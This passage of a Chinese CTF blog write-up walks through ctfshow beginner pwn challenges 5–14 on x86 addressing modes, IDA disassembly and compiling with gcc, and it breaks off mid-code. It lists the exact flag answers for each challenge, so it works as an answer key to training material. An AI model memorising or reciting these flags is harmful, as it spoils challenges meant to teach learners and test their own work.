<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pwn5-34(25有问题搁置) | Rhea's Blog</title><meta name="author" content="Rhea"><meta name="copyright" content="Rhea"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前置基础本分类为让大家了解一些寄存器、寻址方式 汇编代码： section .data	msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0section .text	global _start_start:; 立即寻址方式	mov eax, 11 ; 将11赋值给eax	add eax, 114504 ; eax加上114504	sub eax, 1 ; ea">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn5-34(25有问题搁置)">
<meta property="og:url" content="https://rhea006.github.io/2025/07/d3c259498976.html">
<meta property="og:site_name" content="Rhea&#39;s Blog">
<meta property="og:description" content="前置基础本分类为让大家了解一些寄存器、寻址方式 汇编代码： section .data	msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0section .text	global _start_start:; 立即寻址方式	mov eax, 11 ; 将11赋值给eax	add eax, 114504 ; eax加上114504	sub eax, 1 ; ea">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://rhea006.github.io/img/w4.jpg">
<meta property="article:published_time" content="2025-07-09T04:00:00.000Z">
<meta property="article:modified_time" content="2025-07-19T08:03:42.748Z">
<meta property="article:author" content="Rhea">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://rhea006.github.io/img/w4.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "pwn5-34(25有问题搁置)",
  "url": "https://rhea006.github.io/2025/07/d3c259498976.html",
  "image": "https://rhea006.github.io/img/w4.jpg",
  "datePublished": "2025-07-09T04:00:00.000Z",
  "dateModified": "2025-07-19T08:03:42.748Z",
  "author": [
    {
      "@type": "Person",
      "name": "Rhea",
      "url": "https://rhea006.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://rhea006.github.io/2025/07/d3c259498976.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":-1,"unescape":true,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'pwn5-34(25有问题搁置)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Rhea's Blog" type="application/atom+xml">
</head><body><div id="web_bg" style="background-image: url(/img/background1.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">103</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">65</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/w4.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/images/logo.png" alt="Logo"><span class="site-name">Rhea's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">pwn5-34(25有问题搁置)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">pwn5-34(25有问题搁置)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-09T04:00:00.000Z" title="发表于 2025-07-09 12:00:00">2025-07-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-19T08:03:42.748Z" title="更新于 2025-07-19 16:03:42">2025-07-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/ctfshow-pwn/">ctfshow_pwn</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/ctfshow-pwn/3-%E5%89%8D%E7%BD%AE%E5%9F%BA%E7%A1%80/">3-前置基础</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h1><p>本分类为让大家了解一些寄存器、寻址方式</p>
<p>汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">	msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0</span><br><span class="line">section .text</span><br><span class="line">	global _start</span><br><span class="line">_start:</span><br><span class="line">; 立即寻址方式</span><br><span class="line">	mov eax, 11 ; 将11赋值给eax</span><br><span class="line">	add eax, 114504 ; eax加上114504</span><br><span class="line">	sub eax, 1 ; eax减去1</span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">	mov ebx, 0x36d ; 将0x36d赋值给ebx</span><br><span class="line">	mov edx, ebx ; 将ebx的值赋值给edx</span><br><span class="line">; 直接寻址方式</span><br><span class="line">	mov ecx, [msg] ; 将msg的地址赋值给ecx</span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">	mov esi, msg ; 将msg的地址赋值给esi</span><br><span class="line">	mov eax, [esi] ; 将esi所指向的地址的值赋值给eax</span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">	mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">	add ecx, 4 ; 将ecx加上4</span><br><span class="line">	mov eax, [ecx] ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">	mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">	mov edx, 2 ; 将2赋值给edx</span><br><span class="line">	mov eax, [ecx + edx*2] ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">	mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">	mov edx, 1 ; 将1赋值给edx</span><br><span class="line">	add ecx, 8 ; 将ecx加上8</span><br><span class="line">	mov eax, [ecx + edx*2 - 6] ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line">; 输出字符串</span><br><span class="line">	mov eax, 4 ; 系统调用号4代表输出字符串</span><br><span class="line">	mov ebx, 1 ; 文件描述符1代表标准输出</span><br><span class="line">	mov ecx, msg ; 要输出的字符串的地址</span><br><span class="line">	mov edx, 22 ; 要输出的字符串的长度</span><br><span class="line">	int 0x80 ; 调用系统调用</span><br><span class="line">; 退出程序</span><br><span class="line">	mov eax, 1 ; 系统调用号1代表退出程序</span><br><span class="line">	xor ebx, ebx ; 返回值为0</span><br><span class="line">	int 0x80 ; 调用系统调用</span><br></pre></td></tr></table></figure>

<p>使用NASM汇编器和ld链接器编译成可执行文件。<br>首先，将代码保存为一个文件，例如 <code>Welcome_CTFshow.asm</code> 。然后，使用以下命令将其编译为对象文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nasm -f elf Welcome_to_CTFshow.asm</span><br></pre></td></tr></table></figure>

<p>这将生成一个名为 Welcome_CTFshow.o 的对象文件。接下来，使用以下命令将对象文件链接成可执行文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ld -m elf_i386 -s -o Welcome_to_CTFshow Welcome_to_CTFshow.o</span><br></pre></td></tr></table></figure>

<p>这将生成一个名为 Welcome_CTFshow 的可执行文件。</p>
<p>IDA查看汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048080                 public start</span><br><span class="line">.text:08048080 start           proc near               ; DATA XREF: LOAD:08048018↑o</span><br><span class="line">.text:08048080                 mov     eax, 0Bh</span><br><span class="line">.text:08048085                 add     eax, 1BF48h</span><br><span class="line">.text:0804808A                 sub     eax, 1</span><br><span class="line">.text:0804808D                 mov     ebx, 36Dh</span><br><span class="line">.text:08048092                 mov     edx, ebx</span><br><span class="line">.text:08048094                 mov     ecx, dword ptr aWelcomeToCtfsh ; &quot;Welcome_to_CTFshow_PWN&quot;</span><br><span class="line">.text:0804809A                 mov     esi, offset aWelcomeToCtfsh ; &quot;Welcome_to_CTFshow_PWN&quot;</span><br><span class="line">.text:0804809F                 mov     eax, [esi]</span><br><span class="line">.text:080480A1                 mov     ecx, offset aWelcomeToCtfsh ; &quot;Welcome_to_CTFshow_PWN&quot;</span><br><span class="line">.text:080480A6                 add     ecx, 4</span><br><span class="line">.text:080480A9                 mov     eax, [ecx]</span><br><span class="line">.text:080480AB                 mov     ecx, offset aWelcomeToCtfsh ; &quot;Welcome_to_CTFshow_PWN&quot;</span><br><span class="line">.text:080480B0                 mov     edx, 2</span><br><span class="line">.text:080480B5                 mov     eax, [ecx+edx*2]</span><br><span class="line">.text:080480B8                 mov     ecx, offset aWelcomeToCtfsh ; &quot;Welcome_to_CTFshow_PWN&quot;</span><br><span class="line">.text:080480BD                 mov     edx, 1</span><br><span class="line">.text:080480C2                 add     ecx, 8</span><br><span class="line">.text:080480C5                 mov     eax, [ecx+edx*2-6]</span><br><span class="line">.text:080480C9                 mov     eax, 4</span><br><span class="line">.text:080480CE                 mov     ebx, 1          ; fd</span><br><span class="line">.text:080480D3                 mov     ecx, offset aWelcomeToCtfsh ; &quot;Welcome_to_CTFshow_PWN&quot;</span><br><span class="line">.text:080480D8                 mov     edx, 16h        ; len</span><br><span class="line">.text:080480DD                 int     80h             ; LINUX - sys_write</span><br><span class="line">.text:080480DF                 mov     eax, 1</span><br><span class="line">.text:080480E4                 xor     ebx, ebx        ; status</span><br><span class="line">.text:080480E6                 int     80h             ; LINUX - sys_exit</span><br><span class="line">.text:080480E6 start           endp</span><br><span class="line">.text:080480E6</span><br><span class="line">.text:080480E6 _text           ends</span><br><span class="line">.text:080480E6</span><br><span class="line">.data:080490E8 ; ===========================================================================</span><br><span class="line">.data:080490E8</span><br><span class="line">.data:080490E8 ; Segment type: Pure data</span><br><span class="line">.data:080490E8 ; Segment permissions: Read/Write</span><br><span class="line">.data:080490E8 _data           segment dword public &#x27;DATA&#x27; use32</span><br><span class="line">.data:080490E8                 assume cs:_data</span><br><span class="line">.data:080490E8                 ;org 80490E8h</span><br><span class="line">.data:080490E8 aWelcomeToCtfsh db &#x27;Welcome_to_CTFshow_PWN&#x27;,0</span><br><span class="line">.data:080490E8                                         ; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490E8                                         ; start+14↑r ...</span><br><span class="line">.data:080490E8 _data           ends</span><br><span class="line">.data:080490E8</span><br><span class="line">.data:080490E8</span><br><span class="line">.data:080490E8                 end start</span><br></pre></td></tr></table></figure>

<p>地址为：0x80490E8</p>
<h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>Hint：运行此文件，将得到的字符串以ctfshow{xxxxx}提交。</p>
<p>​        如：运行文件后 输出的内容为 Hello_World</p>
<p>​        提交的flag值为：ctfshow{Hello_World}</p>
<p>​        注：计组原理题型后续的flag中地址字母大写</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./Welcome_to_CTFshow</span><br><span class="line">Welcome_to_CTFshow_PWN</span><br></pre></td></tr></table></figure>

<p>flag:ctfshow{Welcome_to_CTFshow_PWN}</p>
<h2 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h2><p>Hint：立即寻址方式结束后eax寄存器的值为？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 立即寻址方式</span><br><span class="line">	mov eax, 11 ; 将11赋值给eax</span><br><span class="line">	add eax, 114504 ; eax加上114504</span><br><span class="line">	sub eax, 1 ; eax减去1</span><br></pre></td></tr></table></figure>

<p>根据题目源码注释片段可以了解到立即寻址方式在哪，而且可以直接算出，在IDA中对应片段：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048080                 mov     eax, 0Bh</span><br><span class="line">.text:08048085                 add     eax, 1BF48h</span><br><span class="line">.text:0804808A                 sub     eax, 1</span><br></pre></td></tr></table></figure>

<p>结果：0x0b+0x1bf48-0x1&#x3D;0x1bf52&#x3D;114514</p>
<p>flag:ctfshow{114514}</p>
<h2 id="pwn7"><a href="#pwn7" class="headerlink" title="pwn7"></a>pwn7</h2><p>Hint：寄存器寻址方式结束后edx寄存器的值为？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 寄存器寻址方式</span><br><span class="line">	mov ebx, 0x36d ; 将0x36d赋值给ebx</span><br><span class="line">	mov edx, ebx ; 将ebx的值赋值给edx</span><br></pre></td></tr></table></figure>

<p>对应IDA片段：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804808D                 mov     ebx, 36Dh</span><br><span class="line">.text:08048092                 mov     edx, ebx</span><br></pre></td></tr></table></figure>

<p>故flag:ctfshow{0x36D}</p>
<h2 id="pwn8"><a href="#pwn8" class="headerlink" title="pwn8"></a>pwn8</h2><p>Hint：直接寻址方式结束后ecx寄存器的值为？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 直接寻址方式</span><br><span class="line">	mov ecx, [msg] ; 将msg的地址赋值给ecx</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:08048094                 mov     ecx, dword_80490E8</span><br></pre></td></tr></table></figure>

<p>双击dword_80490E8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:080490E8 dword_80490E8   dd 636C6557h            ; DATA XREF: LOAD:0804805C↑o</span><br></pre></td></tr></table></figure>

<p>故flag:ctfshow{0x80490E8}</p>
<h2 id="pwn9"><a href="#pwn9" class="headerlink" title="pwn9"></a>pwn9</h2><p>Hint：寄存器间接寻址方式结束后eax寄存器的值为？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 寄存器间接寻址方式</span><br><span class="line">	mov esi, msg ; 将msg的地址赋值给esi</span><br><span class="line">	mov eax, [esi] ; 将esi所指向的地址的值赋值给eax</span><br></pre></td></tr></table></figure>

<p>对应IDA:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804809A                 mov     esi, offset dword_80490E8</span><br><span class="line">.text:0804809F                 mov     eax, [esi]</span><br></pre></td></tr></table></figure>

<p>双击dword_80490E8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:080490E8 dword_80490E8   dd 636C6557h            ; DATA XREF: LOAD:0804805C↑o</span><br></pre></td></tr></table></figure>

<p>这里是将指向地址 的值赋值给eax</p>
<p>flag:ctfshow{0x636C6557}</p>
<p><code>Tip:</code>字符串 <code>Welcome_to_CTFshow_PWN</code> 的 ASCII 转十六进制，前几个字节是 <code>57 65 6C 63</code>（对应 <code>W e l c</code> ）， <code>636C6557</code> 可能是字节序反转后的结果（小端存储下，<code>0x57656C63</code> 会存为 <code>63 6C 65 57</code> ）</p>
<h2 id="pwn10"><a href="#pwn10" class="headerlink" title="pwn10"></a>pwn10</h2><p>Hint：寄存器相对寻址方式结束后eax寄存器的值为？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 寄存器相对寻址方式</span><br><span class="line">	mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">	add ecx, 4 ; 将ecx加上4</span><br><span class="line">	mov eax, [ecx] ; 将ecx所指向的地址的值赋值给eax</span><br></pre></td></tr></table></figure>

<p>对应IDA:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080480A1                 mov     ecx, offset dword_80490E8</span><br><span class="line">.text:080480A6                 add     ecx, 4</span><br><span class="line">.text:080480A9                 mov     eax, [ecx]</span><br></pre></td></tr></table></figure>

<p>双击dword_80490E8</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:080490E8 dword_80490E8   dd 636C6557h            ; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490E8                                         ; start+14↑r ...</span><br><span class="line">.data:080490EC aOmeToCtfshowPw db &#x27;ome_to_CTFshow_PWN&#x27;,0</span><br></pre></td></tr></table></figure>

<p>这里将msg的地址（0x80490E8）+ 4 处所执向的地址的值赋给eax</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ python3</span><br><span class="line">Python <span class="number">3.12</span><span class="number">.3</span> (main, Feb  <span class="number">4</span> <span class="number">2025</span>, <span class="number">14</span>:<span class="number">48</span>:<span class="number">35</span>) [GCC <span class="number">13.3</span><span class="number">.0</span>] on linux</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">0x80490E8</span>+ <span class="number">4</span>)</span><br><span class="line"><span class="string">&#x27;0x80490ec&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也就是“ome_to_CTFshow_PWN”</p>
<p>故flag:ctfshow{ome_to_CTFshow_PWN}</p>
<h2 id="pwn11"><a href="#pwn11" class="headerlink" title="pwn11"></a>pwn11</h2><p>Hint：寄存器相对寻址方式结束后eax寄存器的值为？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 基址变址寻址方式</span><br><span class="line">	mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">	mov edx, 2 ; 将2赋值给edx</span><br><span class="line">	mov eax, [ecx + edx*2] ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br></pre></td></tr></table></figure>

<p>对应IDA:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080480AB                 mov     ecx, offset dword_80490E8</span><br><span class="line">.text:080480B0                 mov     edx, 2</span><br><span class="line">.text:080480B5                 mov     eax, [ecx+edx*2]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:080490E8 dword_80490E8   dd 636C6557h            ; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490E8                                         ; start+14↑r ...</span><br><span class="line">.data:080490EC aOmeToCtfshowPw db &#x27;ome_to_CTFshow_PWN&#x27;,0</span><br></pre></td></tr></table></figure>

<p>计算最终也是 [0x80490E8 + 2*2 ] &#x3D; [0X80490EC]</p>
<p>故flag:ctfshow{ome_to_CTFshow_PWN}</p>
<h2 id="pwn12"><a href="#pwn12" class="headerlink" title="pwn12"></a>pwn12</h2><p>Hint：相对基址变址寻址方式结束后eax寄存器的值为？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 相对基址变址寻址方式</span><br><span class="line">	mov ecx, msg ; 将msg的地址赋值给ecx</span><br><span class="line">	mov edx, 1 ; 将1赋值给edx</span><br><span class="line">	add ecx, 8 ; 将ecx加上8</span><br><span class="line">	mov eax, [ecx + edx*2 - 6] ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br></pre></td></tr></table></figure>

<p>对应IDA:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:080480B8                 mov     ecx, offset dword_80490E8</span><br><span class="line">.text:080480BD                 mov     edx, 1</span><br><span class="line">.text:080480C2                 add     ecx, 8</span><br><span class="line">.text:080480C5                 mov     eax, [ecx+edx*2-6]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:080490E8 dword_80490E8   dd 636C6557h            ; DATA XREF: LOAD:0804805C↑o</span><br><span class="line">.data:080490E8                                         ; start+14↑r ...</span><br><span class="line">.data:080490EC aOmeToCtfshowPw db &#x27;ome_to_CTFshow_PWN&#x27;,0</span><br></pre></td></tr></table></figure>

<p>同理：[8 + 0x80490E8 + 1*2 - 6] &#x3D; [0x80490EC]</p>
<p>故flag:ctfshow{ome_to_CTFshow_PWN}</p>
<h2 id="pwn13"><a href="#pwn13" class="headerlink" title="pwn13"></a>pwn13</h2><p>Hint：如何使用GCC？编译运行后即可获得flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> flag.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">    char flag[] = &#123;99, 116, 102, 115, 104, 111, 119, 123, 104, 79, 119, 95, 116, 48, 95, 117, 115, 51, 95, 71, 67, 67, 63, 125, 0&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc flag.c -o flag</span><br><span class="line">$ ./flag</span><br><span class="line">ctfshow&#123;hOw_t0_us3_GCC?&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码是一个简单的 C 程序，它使用字符数组 flag 存储了一个加密的字符串，并通过 printf函数将其打印出来。</p>
<p>在这段代码中， flag 数组存储了一串整数值，这些整数值代表了字符的 ASCII 码。通过将这些整数值转换为相应的字符，就可以还原出原始的字符串。</p>
<p>运行该程序， printf 函数使用 %s 格式字符串将 flag 数组作为参数进行打印。由于 flag 数组的最后一个元素为零（NULL 字符）， printf 函数会将其之前的字符依次打印，直到遇到 NULL 字符为止。</p>
<p>根据给定的整数值数组，还原出的字符串为： ctfshow{hOw_t0_us3_GCC?}</p>
<p><code>Tip:gcc [选项] 源文件 -o 输出文件</code></p>
<h2 id="pwn14"><a href="#pwn14" class="headerlink" title="pwn14"></a>pwn14</h2><p>Hint：请你阅读以下源码，给定key为”CTFshow”，编译运行即可获得flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;CTFshow&quot;</span>&gt;key</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">flag.c  key</span><br><span class="line">$ gcc flag.c -o flag</span><br><span class="line">n$ ./flag</span><br><span class="line">ctfshow&#123;01000011_01010100_01000110_01110011_01101000_01101111_01110111_00001010&#125;</span><br></pre></td></tr></table></figure>

<h6 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> flag.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#define BUFFER_SIZE 1024</span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    unsigned char buffer[BUFFER_SIZE];</span><br><span class="line">    size_t n;</span><br><span class="line">    fp = fopen(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == NULL) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Nothing here!&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">    &#125;</span><br><span class="line">    char 